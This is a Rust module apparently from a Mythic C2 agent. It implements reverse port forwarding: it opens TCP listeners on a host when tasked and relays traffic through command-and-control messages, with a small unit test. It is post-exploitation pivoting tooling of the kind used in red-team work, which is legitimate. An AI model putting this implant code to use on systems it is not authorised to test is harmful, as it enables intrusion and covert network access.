use std::collections::{HashMap, VecDeque};
use std::io::{self, Read, Write};
use std::net::{TcpListener, TcpStream};
use std::time::{Duration, Instant};

use base64::{Engine, engine::general_purpose::STANDARD};
use mythic::{ReversePortForwardMessage, TaskMessage, TaskResponse};
use rand::Rng;
use serde::Deserialize;

use crate::streams::StreamDriver;

const MAX_CONNECTIONS: usize = 128;
const MAX_READ_PER_CONN: usize = 32 * 1024;
const MAX_PENDING_WRITE_BYTES: usize = 1024 * 1024;
const CONNECTION_IDLE_TIMEOUT: Duration = Duration::from_secs(300);

struct RpfwdListener {
    listener: TcpListener,
}

struct RpfwdConnection {
    stream: TcpStream,
    port: u32,
    pending_writes: VecDeque<Vec<u8>>,
    last_activity: Instant,
}

#[derive(Debug, Deserialize)]
struct RpfwdParams {
    #[serde(default)]
    action: Option<String>,
    #[serde(default)]
    port: u16,
}

pub struct RpfwdManager {
    listeners: HashMap<u16, RpfwdListener>,
    connections: HashMap<u32, RpfwdConnection>,
    outbound: VecDeque<ReversePortForwardMessage>,
    last_activity: Option<Instant>,
}

impl RpfwdManager {
    pub fn new() -> Self {
        Self {
            listeners: HashMap::new(),
            connections: HashMap::new(),
            outbound: VecDeque::new(),
            last_activity: None,
        }
    }

    pub fn start_from_task(&mut self, task: &TaskMessage) -> TaskResponse {
        let params = match parse_params(task) {
            Ok(params) => params,
            Err(e) => return TaskResponse::failed(task.id, &e),
        };
        if params.port == 0 {
            return TaskResponse::failed(task.id, "rpfwd port must be between 1 and 65535");
        }

        let action = params.action.as_deref().unwrap_or("start");
        match action {
            "start" => match self.start_listener(params.port) {
                Ok(()) => TaskResponse::completed(
                    task.id,
                    &format!("rpfwd listening on 0.0.0.0:{}\n", params.port),
                ),
                Err(e) => TaskResponse::failed(
                    task.id,
                    &format!(
                        "failed to start rpfwd listener on port {}: {e}",
                        params.port
                    ),
                ),
            },
            "stop" => {
                self.stop_listener(params.port);
                TaskResponse::completed(
                    task.id,
                    &format!("rpfwd listener stopped on port {}\n", params.port),
                )
            }
            _ => TaskResponse::failed(task.id, "rpfwd action must be start or stop"),
        }
    }

    pub fn handle_inbound(&mut self, messages: Vec<ReversePortForwardMessage>) {
        for message in messages {
            self.handle_message(message);
        }
    }

    pub fn drain_outbound(&mut self) -> Vec<ReversePortForwardMessage> {
        self.poll();
        self.outbound.drain(..).collect()
    }

    pub fn requeue_outbound_front(&mut self, messages: Vec<ReversePortForwardMessage>) {
        for message in messages.into_iter().rev() {
            self.outbound.push_front(message);
        }
    }

    pub fn wants_fast_poll(&self) -> bool {
        !self.listeners.is_empty()
            || !self.connections.is_empty()
            || !self.outbound.is_empty()
            || self
                .last_activity
                .is_some_and(|activity| activity.elapsed() < Duration::from_secs(5))
    }

    fn start_listener(&mut self, port: u16) -> io::Result<()> {
        if self.listeners.contains_key(&port) {
            return Ok(());
        }
        let listener = TcpListener::bind(("0.0.0.0", port))?;
        listener.set_nonblocking(true)?;
        self.listeners.insert(port, RpfwdListener { listener });
        self.last_activity = Some(Instant::now());
        Ok(())
    }

    fn stop_listener(&mut self, port: u16) {
        self.listeners.remove(&port);
        let ids: Vec<u32> = self
            .connections
            .iter()
            .filter_map(|(id, conn)| (conn.port == port as u32).then_some(*id))
            .collect();
        for id in ids {
            self.close(id, true);
        }
        self.last_activity = Some(Instant::now());
    }

    fn handle_message(&mut self, message: ReversePortForwardMessage) {
        self.last_activity = Some(Instant::now());
        if message.exit {
            self.close(message.server_id, false);
            return;
        }

        let Some(data) = message.data.as_deref() else {
            return;
        };
        let decoded = match STANDARD.decode(data) {
            Ok(decoded) => decoded,
            Err(_) => {
                self.close(message.server_id, true);
                return;
            }
        };

        if let Some(connection) = self.connections.get_mut(&message.server_id) {
            if pending_write_bytes(connection).saturating_add(decoded.len())
                > MAX_PENDING_WRITE_BYTES
            {
                self.close(message.server_id, true);
                return;
            }
            connection.pending_writes.push_back(decoded);
            connection.last_activity = Instant::now();
            if flush_pending_writes(connection).is_err() {
                self.close(message.server_id, true);
            }
        }
    }

    fn poll(&mut self) {
        self.accept_new_connections();
        self.poll_connections();
    }

    fn accept_new_connections(&mut self) {
        let ports: Vec<u16> = self.listeners.keys().copied().collect();
        for port in ports {
            loop {
                if self.connections.len() >= MAX_CONNECTIONS {
                    break;
                }
                let accept_result = match self.listeners.get(&port) {
                    Some(listener) => listener.listener.accept(),
                    None => break,
                };
                match accept_result {
                    Ok((stream, _)) => {
                        if stream.set_nonblocking(true).is_ok() {
                            let server_id = self.next_server_id();
                            self.connections.insert(
                                server_id,
                                RpfwdConnection {
                                    stream,
                                    port: port as u32,
                                    pending_writes: VecDeque::new(),
                                    last_activity: Instant::now(),
                                },
                            );
                            self.queue_data(server_id, Some(port as u32), &[], false);
                            self.last_activity = Some(Instant::now());
                        }
                    }
                    Err(e) if e.kind() == io::ErrorKind::WouldBlock => break,
                    Err(_) => break,
                }
            }
        }
    }

    fn poll_connections(&mut self) {
        let ids: Vec<u32> = self.connections.keys().copied().collect();
        for id in ids {
            let mut close = false;
            if let Some(connection) = self.connections.get_mut(&id) {
                if connection.last_activity.elapsed() >= CONNECTION_IDLE_TIMEOUT {
                    close = true;
                }
                if flush_pending_writes(connection).is_err() {
                    close = true;
                }
            }
            if close {
                self.close(id, true);
                continue;
            }

            loop {
                let mut buf = [0u8; MAX_READ_PER_CONN];
                let read_result = match self.connections.get_mut(&id) {
                    Some(connection) => connection.stream.read(&mut buf),
                    None => break,
                };
                match read_result {
                    Ok(0) => {
                        close = true;
                        break;
                    }
                    Ok(n) => {
                        if let Some(connection) = self.connections.get_mut(&id) {
                            connection.last_activity = Instant::now();
                        }
                        let port = self.connections.get(&id).map(|conn| conn.port);
                        self.queue_data(id, port, &buf[..n], false);
                        if n < MAX_READ_PER_CONN {
                            break;
                        }
                    }
                    Err(e) if e.kind() == io::ErrorKind::WouldBlock => break,
                    Err(_) => {
                        close = true;
                        break;
                    }
                }
            }
            if close {
                self.close(id, true);
            }
        }
    }

    fn close(&mut self, server_id: u32, notify_mythic: bool) {
        let port = self.connections.remove(&server_id).map(|conn| conn.port);
        if notify_mythic {
            self.outbound.push_back(ReversePortForwardMessage {
                server_id,
                exit: true,
                data: Some(String::new()),
                port,
            });
        }
    }

    fn queue_data(&mut self, server_id: u32, port: Option<u32>, data: &[u8], exit: bool) {
        self.last_activity = Some(Instant::now());
        self.outbound.push_back(ReversePortForwardMessage {
            server_id,
            exit,
            data: Some(STANDARD.encode(data)),
            port,
        });
    }

    fn next_server_id(&self) -> u32 {
        let mut rng = rand::thread_rng();
        loop {
            let id = rng.r#gen::<u32>();
            if id != 0 && !self.connections.contains_key(&id) {
                return id;
            }
        }
    }
}

impl StreamDriver for RpfwdManager {
    type Message = ReversePortForwardMessage;

    fn handle_inbound(&mut self, messages: Vec<Self::Message>) {
        RpfwdManager::handle_inbound(self, messages);
    }

    fn drain_outbound(&mut self) -> Vec<Self::Message> {
        RpfwdManager::drain_outbound(self)
    }

    fn requeue_outbound_front(&mut self, messages: Vec<Self::Message>) {
        RpfwdManager::requeue_outbound_front(self, messages);
    }

    fn wants_fast_poll(&self) -> bool {
        RpfwdManager::wants_fast_poll(self)
    }
}

fn parse_params(task: &TaskMessage) -> Result<RpfwdParams, String> {
    let parameters = task.parameters.trim();
    let parameters = if parameters.is_empty() {
        "{}"
    } else {
        parameters
    };
    serde_json::from_str::<RpfwdParams>(parameters).map_err(|e| format!("rpfwd parse error: {e}"))
}

fn pending_write_bytes(connection: &RpfwdConnection) -> usize {
    connection.pending_writes.iter().map(Vec::len).sum()
}

fn flush_pending_writes(connection: &mut RpfwdConnection) -> io::Result<()> {
    while let Some(mut data) = connection.pending_writes.pop_front() {
        while !data.is_empty() {
            match connection.stream.write(&data) {
                Ok(0) => {
                    return Err(io::Error::new(
                        io::ErrorKind::WriteZero,
                        "socket write returned zero bytes",
                    ));
                }
                Ok(n) => {
                    data.drain(..n);
                    connection.last_activity = Instant::now();
                }
                Err(e) if e.kind() == io::ErrorKind::WouldBlock => {
                    connection.pending_writes.push_front(data);
                    return Ok(());
                }
                Err(e) => return Err(e),
            }
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use uuid::Uuid;

    #[test]
    fn start_rejects_zero_port() {
        let mut manager = RpfwdManager::new();
        let task = TaskMessage {
            id: Uuid::new_v4(),
            command: "rpfwd".into(),
            parameters: r#"{"port":0}"#.into(),
            ..Default::default()
        };
        let response = manager.start_from_task(&task);
        assert_eq!(response.status.as_deref(), Some("error"));
    }
}
